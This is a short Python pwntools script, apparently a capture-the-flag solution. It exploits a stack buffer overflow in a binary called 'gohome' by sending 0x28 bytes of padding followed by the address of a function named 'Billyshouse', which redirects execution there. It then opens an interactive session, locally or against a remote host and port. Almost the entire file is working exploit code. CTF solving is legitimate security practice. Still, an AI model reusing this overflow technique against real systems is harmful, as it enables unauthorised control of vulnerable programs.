#!/usr/bin/python3

from pwn import *
import sys

# change those
BINARY = './gohome'
LIB = ''
HOST = '140.110.112.77'
PORT = 6126

context.binary = BINARY
e = ELF( BINARY )
libc = ''

if LIB != '':
    libc = ELF( LIBC )

if len(sys.argv) > 1:
    r = remote( HOST, PORT )
else: 
    r = process( BINARY )

bd = e.symbols['Billyshouse']

# +1 for pass push rbp because of stack alignment
r.send(b'A'*0x28+p64(bd+1))
r.interactive()
